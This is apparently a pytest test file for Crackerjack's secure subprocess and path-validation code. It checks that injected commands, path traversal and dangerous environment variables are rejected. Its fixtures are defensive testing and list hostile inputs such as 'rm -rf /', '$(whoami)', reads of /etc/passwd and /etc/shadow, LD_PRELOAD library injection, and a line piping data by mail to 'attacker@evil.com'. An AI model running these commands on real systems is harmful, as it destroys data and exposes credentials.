"""
Comprehensive security hardening tests for subprocess execution.

This module tests the security enhancements implemented to prevent
injection attacks and ensure secure subprocess execution throughout Crackerjack.
"""

import subprocess
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from crackerjack.services.secure_path_utils import (
    SecurePathValidator,
    SubprocessPathValidator,
)
from crackerjack.services.secure_subprocess import (
    CommandValidationError,
    SecureSubprocessExecutor,
    SubprocessSecurityConfig,
    execute_secure_subprocess,
)


class TestSecureSubprocessExecutor:
    """Test secure subprocess execution with comprehensive validation."""

    def setup_method(self):
        """Set up test environment."""
        self.config = SubprocessSecurityConfig(
            max_command_length=1000,
            max_arg_length=100,
            max_env_vars=50,
            blocked_executables={"rm", "sudo", "su"},
            enable_command_logging=True,
        )
        self.executor = SecureSubprocessExecutor(self.config)

    def test_validates_empty_command(self):
        """Test that empty commands are rejected."""
        with pytest.raises(CommandValidationError, match="Command cannot be empty"):
            self.executor._validate_command([])

    def test_validates_non_list_command(self):
        """Test that non-list commands are rejected."""
        with pytest.raises(CommandValidationError, match="Command must be a list"):
            self.executor._validate_command("echo test")

    def test_validates_command_length_limit(self):
        """Test that overly long commands are rejected."""
        long_command = ["echo"] + ["x" * 200 for _ in range(10)]

        with pytest.raises(CommandValidationError, match="Command too long"):
            self.executor._validate_command(long_command)

    def test_validates_argument_length_limit(self):
        """Test that overly long arguments are rejected."""
        long_arg_command = ["echo", "x" * 500]

        with pytest.raises(CommandValidationError, match="Argument.*too long"):
            self.executor._validate_command(long_arg_command)

    def test_blocks_dangerous_executables(self):
        """Test that dangerous executables are blocked."""
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["sudo", "whoami"],
            ["su", "root"],
        ]

        for cmd in dangerous_commands:
            with pytest.raises(CommandValidationError, match="blocked"):
                self.executor._validate_command(cmd)

    def test_detects_shell_injection_patterns(self):
        """Test detection of shell injection patterns."""
        injection_commands = [
            ["echo", "test; rm -rf /"],
            ["ls", "$(whoami)"],
            ["cat", "`id`"],
            ["echo", "test | sudo bash"],
            ["find", "../../../etc/passwd"],
            ["grep", "pattern", "file > /etc/shadow"],
        ]

        for cmd in injection_commands:
            with pytest.raises(CommandValidationError, match="validation failed"):
                self.executor._validate_command(cmd)

    def test_validates_working_directory_path_traversal(self):
        """Test that path traversal in working directory is prevented."""
        dangerous_cwds = [
            "../../../etc",
            "/etc/passwd",
            "../../var/log",
            "~/../../root",
        ]

        for cwd in dangerous_cwds:
            with pytest.raises(CommandValidationError, match="working directory"):
                self.executor._validate_cwd(cwd)

    def test_sanitizes_dangerous_environment_variables(self):
        """Test that dangerous environment variables are filtered."""
        dangerous_env = {
            "LD_PRELOAD": "/malicious/lib.so",
            "DYLD_INSERT_LIBRARIES": "/malicious/lib.dylib",
            "IFS": "$",
            "PS4": "$(malicious_command)",
            "PATH": "/usr/bin:/bin",
            "SAFE_VAR": "safe_value",
        }

        sanitized = self.executor._sanitize_environment(dangerous_env)

        # Dangerous variables should be filtered out
        assert "LD_PRELOAD" not in sanitized
        assert "DYLD_INSERT_LIBRARIES" not in sanitized
        assert "IFS" not in sanitized
        assert "PS4" not in sanitized

        # Safe variables should remain
        assert "SAFE_VAR" in sanitized
        assert sanitized["SAFE_VAR"] == "safe_value"

    def test_validates_environment_variable_sizes(self):
        """Test validation of environment variable sizes."""
        large_env = {
            "NORMAL_VAR": "normal_value",
            "HUGE_VAR": "x" * (self.config.max_env_var_length + 1),
        }

        sanitized = self.executor._sanitize_environment(large_env)

        # Large variable should be filtered
        assert "HUGE_VAR" not in sanitized
        assert "NORMAL_VAR" in sanitized

    def test_validates_timeout_limits(self):
        """Test timeout validation."""
        # Negative timeout
        with pytest.raises(CommandValidationError, match="must be positive"):
            self.executor._validate_timeout(-1)

        # Zero timeout
        with pytest.raises(CommandValidationError, match="must be positive"):
            self.executor._validate_timeout(0)

        # Excessive timeout
        with pytest.raises(CommandValidationError, match="too large"):
            self.executor._validate_timeout(self.config.max_timeout + 1)

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_successful_secure_execution(self, mock_run):
        """Test successful secure subprocess execution."""
        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test output"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        result = self.executor.execute_secure(
            command=["echo", "test"],
            timeout=30,
        )

        assert result.returncode == 0
        assert result.stdout == "test output"
        mock_run.assert_called_once()

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_subprocess_timeout_logging(self, mock_run):
        """Test that subprocess timeouts are properly logged."""
        # Mock timeout exception
        mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)

        with pytest.raises(subprocess.TimeoutExpired):
            self.executor.execute_secure(
                command=["sleep", "60"],
                timeout=30,
            )

    def test_environment_injection_detection(self):
        """Test detection of injection patterns in environment variables."""
        malicious_env = {
            "NORMAL": "safe_value",
            "INJECTION1": "value; rm -rf /",
            "INJECTION2": "$(malicious_command)",
            "INJECTION3": "`backdoor`",
        }

        sanitized = self.executor._sanitize_environment(malicious_env)

        # Injections should be filtered
        assert "INJECTION1" not in sanitized
        assert "INJECTION2" not in sanitized
        assert "INJECTION3" not in sanitized

        # Safe value should remain
        assert "NORMAL" in sanitized


class TestSecurePathValidator:
    """Test secure path validation functionality."""

    def test_detects_path_traversal_patterns(self):
        """Test detection of various path traversal patterns."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2fetc%2fpasswd",  # URL encoded
            "%252e%252e%252f",  # Double encoded
            "normal/path/../../etc/shadow",
            "test%c0%2e%c0%2e%c0%2fpasswd",  # UTF-8 overlong
        ]

        for path in traversal_paths:
            with pytest.raises(Exception):  # Should raise ExecutionError
                SecurePathValidator.validate_safe_path(path)

    def test_detects_null_byte_patterns(self):
        """Test detection of null byte injection patterns."""
        null_byte_paths = [
            "file.txt%00.exe",
            "test\x00malicious",
            "path%c0%80file",
            "normal%00../../etc/passwd",
        ]

        for path in null_byte_paths:
            with pytest.raises(Exception):  # Should raise ExecutionError
                SecurePathValidator.validate_safe_path(path)

    def test_validates_path_within_base_directory(self):
        """Test validation that paths stay within base directory."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            safe_file = base_path / "safe_file.txt"
            safe_file.touch()

            # Safe path should validate
            validated = SecurePathValidator.validate_safe_path(safe_file, base_path)
            assert validated == safe_file.resolve()

            # Path outside base should fail
            outside_path = Path("/etc/passwd")
            with pytest.raises(Exception):
                SecurePathValidator.validate_safe_path(outside_path, base_path)

    def test_secure_path_join_prevents_traversal(self):
        """Test that secure path joining prevents traversal."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)

            # Safe join should work
            result = SecurePathValidator.secure_path_join(
                base_path, "subdir", "file.txt"
            )
            assert result.parent.parent == base_path

            # Traversal attempts should fail
            with pytest.raises(Exception):
                SecurePathValidator.secure_path_join(
                    base_path, "../../../etc", "passwd"
                )


class TestSubprocessPathValidator:
    """Test subprocess-specific path validation."""

    def test_validates_subprocess_working_directory(self):
        """Test validation of subprocess working directories."""
        dangerous_dirs = [
            "/etc",
            "/boot",
            "/sys/kernel",
            "/proc",
            "/dev/null",
            "/root",
            "/var/log",
        ]

        for dir_path in dangerous_dirs:
            with pytest.raises(Exception):  # Should raise ExecutionError
                SubprocessPathValidator.validate_subprocess_cwd(dir_path)

    def test_validates_executable_paths(self):
        """Test validation of executable paths."""
        dangerous_executables = [
            "/usr/bin/sudo",
            "/bin/su",
            "/usr/bin/passwd",
            "/sbin/reboot",
            "/usr/sbin/shutdown",
        ]

        for exec_path in dangerous_executables:
            with pytest.raises(Exception):  # Should raise ExecutionError
                SubprocessPathValidator.validate_executable_path(exec_path)

    def test_allows_safe_command_names(self):
        """Test that safe command names are allowed."""
        safe_commands = [
            "python",
            "pytest",
            "git",
            "ls",
            "grep",
            "find",
        ]

        for cmd in safe_commands:
            # Should not raise exception for command names
            result = SubprocessPathValidator.validate_executable_path(cmd)
            assert result == Path(cmd)


class TestSecurityIntegration:
    """Test integration of security components."""

    def test_secure_subprocess_function(self):
        """Test the convenience function for secure subprocess execution."""
        with patch("crackerjack.services.secure_subprocess.subprocess.run") as mock_run:
            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = "success"
            mock_run.return_value = mock_result

            result = execute_secure_subprocess(["echo", "test"])

            assert result.returncode == 0
            assert result.stdout == "success"
            mock_run.assert_called_once()

    def test_security_logging_integration(self):
        """Test that security events are properly logged."""
        with patch(
            "crackerjack.services.secure_subprocess.get_security_logger"
        ) as mock_logger_getter:
            mock_logger = Mock()
            mock_logger_getter.return_value = mock_logger

            executor = SecureSubprocessExecutor()

            # Attempt dangerous command
            with pytest.raises(CommandValidationError):
                executor._validate_command(["rm", "-rf", "/"])

            # Security logging should have been called
            mock_logger.log_dangerous_command_blocked.assert_called_once()

    def test_environment_sanitization_logging(self):
        """Test that environment sanitization is logged."""
        with patch(
            "crackerjack.services.secure_subprocess.get_security_logger"
        ) as mock_logger_getter:
            mock_logger = Mock()
            mock_logger_getter.return_value = mock_logger

            executor = SecureSubprocessExecutor()

            # Sanitize environment with dangerous variables
            dangerous_env = {f"PYTHON_{i}": "value" for i in range(20)}
            dangerous_env.update({"LD_PRELOAD": "malicious.so"})

            sanitized = executor._sanitize_environment(dangerous_env)

            # Should have filtered dangerous variables
            assert "LD_PRELOAD" not in sanitized

            # Logging should have occurred
            mock_logger.log_environment_variable_filtered.assert_called()


class TestRegressionPrevention:
    """Test that security fixes don't break existing functionality."""

    def test_normal_commands_still_work(self):
        """Test that normal, safe commands still execute properly."""
        safe_commands = [
            ["python", "--version"],
            ["git", "status"],
            ["ls", "-la"],
            ["echo", "hello world"],
        ]

        executor = SecureSubprocessExecutor()

        for cmd in safe_commands:
            # Should not raise validation errors
            validated = executor._validate_command(cmd)
            assert validated == cmd

    def test_safe_environments_pass_validation(self):
        """Test that normal environments pass validation."""
        safe_env = {
            "HOME": "/home/user",
            "USER": "testuser",
            "LANG": "en_US.UTF-8",
            "TERM": "xterm-256color",
            "EDITOR": "vim",
            "GIT_AUTHOR_NAME": "Test User",
        }

        executor = SecureSubprocessExecutor()
        sanitized = executor._sanitize_environment(safe_env)

        # All safe variables should be present
        for key, value in safe_env.items():
            assert sanitized[key] == value

    def test_reasonable_timeouts_are_allowed(self):
        """Test that reasonable timeout values are accepted."""
        executor = SecureSubprocessExecutor()

        reasonable_timeouts = [1, 30, 60, 300, 1800]  # 1s to 30m

        for timeout in reasonable_timeouts:
            # Should not raise exception
            validated = executor._validate_timeout(timeout)
            assert validated == timeout


@pytest.mark.integration
class TestEndToEndSecurity:
    """End-to-end security testing."""

    def test_prevents_command_injection_attack(self):
        """Test that command injection attacks are prevented."""
        malicious_commands = [
            ["echo", "test; cat /etc/passwd"],
            ["find", ".", "-name", "*.py", "-exec", "rm", "{}", ";"],
            ["grep", "pattern", "file", "|", "mail", "attacker@evil.com"],
        ]

        for cmd in malicious_commands:
            with pytest.raises(CommandValidationError):
                execute_secure_subprocess(cmd)

    def test_prevents_environment_variable_injection(self):
        """Test that environment variable injection is prevented."""
        malicious_env = {
            "LD_PRELOAD": "/tmp/malicious.so",
            "DYLD_INSERT_LIBRARIES": "/tmp/backdoor.dylib",
            "BASH_ENV": "/tmp/malicious_script.sh",
        }

        # Should not raise exception but should filter dangerous variables
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            execute_secure_subprocess(command=["echo", "test"], env=malicious_env)

            # Check that dangerous env vars were not passed
            called_env = mock_run.call_args[1]["env"]
            assert "LD_PRELOAD" not in called_env
            assert "DYLD_INSERT_LIBRARIES" not in called_env
            assert "BASH_ENV" not in called_env

    def test_prevents_working_directory_escape(self):
        """Test that working directory escapes are prevented."""
        with tempfile.TemporaryDirectory():
            dangerous_dirs = [
                "../../../etc",
                "/etc/passwd",
                "../../root",
            ]

            for dangerous_cwd in dangerous_dirs:
                with pytest.raises(CommandValidationError):
                    execute_secure_subprocess(command=["pwd"], cwd=dangerous_cwd)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
